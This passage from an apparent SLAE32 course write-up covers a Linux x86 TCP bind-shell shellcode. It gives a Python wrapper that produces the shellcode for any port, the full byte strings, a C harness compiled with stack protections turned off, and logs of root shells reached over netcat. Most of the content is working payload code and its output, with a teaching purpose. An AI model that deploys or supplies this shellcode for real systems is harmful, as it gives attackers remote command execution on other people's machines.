root# nc.traditional 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
Perfect! Our TCP-IP Bind Shell, Shellcode works as intended when injected into another program!  
The next assignment in the SLAE32 course is to create a TCP-IP Reverse Shell, Shellcode.

## TCP Bind Shellcode Wrapper
#### Python Wrapper Script
```python
#!/usr/bin/python
# Filename: tcpBind.py
# Author:   boku

# Take users TCP port as input
port = raw_input("Enter TCP Port Number: ")
# Convert input string to an integer
deciPort = int(port)
# Format the integer to Hex Integer
hexPort = "{:02x}".format(deciPort)
#print "Hex value of Decimal Number:",hexPort
# Check the length of the output hex string
hexStrLen = len(hexPort)
# Check if the hex string is even or odd with modulus 2
oddEven = hexStrLen % 2
# if it returns 1 then it's odd. We need to add a leading 0
if oddEven == 1:
    hexPort = "0" + hexPort
    #print hexPort    # commented out. Used for debugging
# converts the  port number into the correct hex format
tcpPort = "\\x".join(hexPort[i:i+2] for i in range(0,len(hexPort), 2))
print "Your TCP Port in Hex is:","\\x"+tcpPort
nullCheck = deciPort % 256
if nullCheck == 0 :
    print "Your TCP Port contains a Null 0x00."
    print "Try again with a different Port Number."
    exit(0)
#print "\\x"+hexString   # debugging

scPart1 = "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89"
scPart1 += "\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xd2\x52\x66\x68"
#Decimal 4444 = \x11\x5c = 0x115c # debugging
#tcpPort = "\x11\x5c"
scPart2 = "\x66\x53\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89"
scPart2 += "\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
scPart2 += "\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51"
scPart2 += "\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f"
scPart2 += "\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
scPart2 += "\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"

# Initiate the Shellcode variable we will output
shellcode = ""

# Add the first part of the tcp bind shellcode
for x in bytearray(scPart1) :
    shellcode += '\\x'
    shellcode += '%02x' %x
# Add the user added tcp port to the shellcode
shellcode += "\\x"+tcpPort
# Add the second part of the tcp bind shellcode
for x in bytearray(scPart2) :
    shellcode += '\\x'
    shellcode += '%02x' %x

print "Choose your shellcode export format."
exportFormat = raw_input("[1] = C Format\n[2] = Python Format\n[1]: ")
if exportFormat == "2" : 
    formatSC = '"\nshellcode += "'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[-----------------------Your-Shellcode------------------------]"
    print 'shellcode = "'+formatSC+'"'
else :
    formatSC = '"\n"'.join(shellcode[i:i+48] for i in range(0,len(shellcode), 48))
    print "[----------------Your-Shellcode------------------]"
    print ' unsigned char shellcode[] = \\\n"'+formatSC+'";'
```
+ Awesome! Now lets test it with the TCP Port 4444

### Testing Wrapper with Port 4444
```console
root# python tcpbindwrapper.py
Enter TCP Port Number: 4444
Your TCP Port in Hex is: \x11\x5c
Choose your shellcode export format.
[1] = C Format
[2] = Python Format
[1]: 1
[----------------Your-Shellcode------------------]
shellcode = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53"
"\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31"
"\xdb\xb3\x02\x31\xd2\x52\x66\x68\x11\x5c\x66\x53"
"\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80"
"\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
"\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05"
"\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0"
"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x89\xd1\xb0\x0b\xcd\x80";
```
#### Add Shellcode to C Program
```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53"
"\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31"
"\xdb\xb3\x02\x31\xd2\x52\x66\x68\x11\x5c\x66\x53"
"\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80"
"\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
"\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05"
"\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0"
"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x89\xd1\xb0\x0b\xcd\x80";
main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```
#### Compile Host C Program
```console
root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```

#### Test the shellcode - Port 4444
```console
# WINDOW 1
root# ./shellcode
Shellcode Length:  114

# WINDOW 2
root# netstat -tnalp | grep shellcode
tcp  0.0.0.0:4444   0.0.0.0:*  LISTEN  8004/shellcode
root# nc 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

### Testing Wrapper with Port 13337
```console
root# python tcpbindwrapper.py
Enter TCP Port Number: 13337
Your TCP Port in Hex is: \x34\x19
Choose your shellcode export format.
[1] = C Format
[2] = Python Format
[1]: 1
[----------------Your-Shellcode------------------]
shellcode = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53"
"\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31"
"\xdb\xb3\x02\x31\xd2\x52\x66\x68\x34\x19\x66\x53"
"\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80"
"\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
"\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05"
"\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0"
"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x89\xd1\xb0\x0b\xcd\x80";
```
#### Add Shellcode to C Program
```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53"
"\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\xb0\x66\x31"
"\xdb\xb3\x02\x31\xd2\x52\x66\x68\x34\x19\x66\x53"
"\x31\xc9\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80"
"\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x31\xc9\x51\x56"
"\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05"
"\x31\xc9\x51\x51\x56\x89\xe1\xcd\x80\x93\x31\xc0"
"\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x89\xd1\xb0\x0b\xcd\x80";
main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}
```

#### Test the shellcode - Port 13337
```console
# WINDOW 1
# Comiple C Program
root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
# Run C Program
root# ./shellcode
Shellcode Length:  114

# WINDOW 2
root# netstat -tnalp | grep shellcode
tcp  0.0.0.0:13337   0.0.0.0:*  LISTEN  9627/shellcode
root# nc 127.0.0.1 13337
id
uid=0(root) gid=0(root) groups=0(root)
```
+ Awesome! The wrapper works as intended, allowing easy port configuration!




